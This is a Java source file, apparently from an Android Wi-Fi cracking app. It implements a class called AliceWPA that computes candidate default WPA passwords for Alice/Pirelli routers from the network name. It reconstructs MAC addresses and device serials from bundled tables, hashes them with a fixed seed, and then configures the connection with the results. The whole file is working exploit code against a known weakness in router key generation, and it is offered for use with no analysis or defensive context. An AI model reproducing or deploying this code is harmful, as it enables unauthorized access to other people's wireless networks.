package it.creazioni;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.Vector;

import android.content.Context;
import android.content.res.Resources;
import android.net.wifi.WifiManager;





public class AliceWPA extends VulnWifi{
	

	
	public AliceWPA(String bssid, String essid, WifiManager wifiManager,Context con){
		setManager(wifiManager);
		setContext(con);
		setESSID(essid);
		setBSSID(bssid);
		counterpass=0;
		le_pass=crackMe();
		configNet();
	}
	public Vector<String> crackMe() {
		Vector<String> le_pass= new Vector<String>();
		Vector<String> internal_macs= new Vector<String>();
		final String fixed = new String("64C6DDE3E579B6D986968D3445D23B15CAAF128402AC560005CE2075913FDCE8");
		final String conv_table= new String("0123456789abcdefghijklmnopqrstuvwxyz0123456789abcdefghijklmnopqrstuvwxyz0123456789abcdefghijklmnopqrstuvwxyz0123456789abcdefghijklmnopqrstuvwxyz0123456789abcdefghijklmnopqrstuvwxyz0123456789abcdefghijklmnopqrstuvwxyz0123456789abcdefghijklmnopqrstuvwxyz0123");
		internal_macs= findMac();
		if (internal_macs.size()==0){
			return le_pass;
		}
		ArrayList<String> list_serial=findSerial();
		if (list_serial.size()==0){
			return le_pass;
		}
		for (int i=0;i<internal_macs.size();i++){
			for (int j=0;j<list_serial.size();j++){
				String hash=hash(fixed+stringToHex(list_serial.get(j))+internal_macs.get(i), "SHA256");
				StringBuilder sb = new StringBuilder();
				for (int e=0;e<48;e+=2){
					int index;
					sb.append(conv_table.substring(index=Integer.parseInt(hash.substring(e, e+2), 16),index+1));
				}
				System.out.println(sb.toString());
				le_pass.add(sb.toString());
				
			}
		}
		return le_pass;
		//return hash;
	}
	//find internal MAC address
	private Vector<String> findMac(){
		Vector<String> internal_macs= new Vector<String>();
		String [] lastpartmac_with_pad=new String[3];
		//take last 8 digits of SSID Alice-(12345678)
		//plus eventual padding with 1 or 2
		//review procedure in order to take only the correct padding
		//http://www.gibit.net/forum/viewtopic.php?f=10&t=11
		//essid_router="Alice-52855473";
		lastpartmac_with_pad[0]=Integer.toHexString(Integer.parseInt(essid_router.substring(6, 14))); 
		lastpartmac_with_pad[1]=Integer.toHexString(Integer.parseInt("1"+essid_router.substring(6, 14))); ;
		lastpartmac_with_pad[2]=Integer.toHexString(Integer.parseInt("2"+essid_router.substring(6, 14))); ;
		Resources res = con.getResources();
		String[] mac_alice_pirelli = res.getStringArray(R.array.mac_alice_pirelli);
		for (int i=0;i<mac_alice_pirelli.length;i++){
			for(int j=0;j<=2;j++){
				if((lastpartmac_with_pad[j].substring(0, 1)).equals(mac_alice_pirelli[i].substring(5, 6))){
					//System.out.println(mac_alice_pirelli[i]+lastpartmac_with_pad[j].substring(1,7));
					internal_macs.add(mac_alice_pirelli[i]+lastpartmac_with_pad[j].substring(1,7));
				}
			}
		}
		return internal_macs;
	}
	
	private ArrayList<String> findSerial(){
		ArrayList<String> serials = new ArrayList<String>();
		HashMap<String,String> Hmagic_numbers=new HashMap<String, String>();;
		Resources res = con.getResources();
		//essid_router="Alice-52855473";
		String[] magic_numbers = res.getStringArray(R.array.magic_numbers);
		String kssid= new String();
		int count=0;
		for(int i=0;i<magic_numbers.length;i++){
			//use ssid as key + counter if more ssid
			String key=magic_numbers[i].split(",")[0];
			if(key.equals(kssid)){
				count++;
			}else{
				count=0;
			}
			//managing ssid with jolly like 84X
			if(magic_numbers[i].split(",")[0].indexOf("X")>-1){
				for(int e=0;e<10;e++){
					Hmagic_numbers.put(magic_numbers[i].split(",")[0].replace("X", Integer.toString(e))+"-"+Integer.toString(count),magic_numbers[i]);
				}
			}
			Hmagic_numbers.put(magic_numbers[i].split(",")[0]+"-"+Integer.toString(count),magic_numbers[i]); 
			kssid=key;
		}
		count=0;
		//could be more magic numbers corresponding to ssid
		while(Hmagic_numbers.get(essid_router.substring(6, 9)+"-"+Integer.toString(count))!=null){
			serials.add(doMath(Hmagic_numbers.get(essid_router.substring(6, 9)+"-"+Integer.toString(count)),Integer.parseInt(essid_router.substring(6, 14))));
			count++;
			
		}

		return serials;
	}
	public String doMath(String parameters, int ssid_num){
		String sn1=parameters.split(",")[1];
		int q=Integer.parseInt(parameters.split(",")[3]);
		int k=Integer.parseInt(parameters.split(",")[2]);
		int sn2=(ssid_num-q)/k;
		String serial=Integer.toString(sn2);
		while(serial.length()<7){
			serial="0"+serial;
		}
		//System.out.println("SERIALE"+sn1+"X"+serial);
		return sn1+"X"+serial;
	}

}
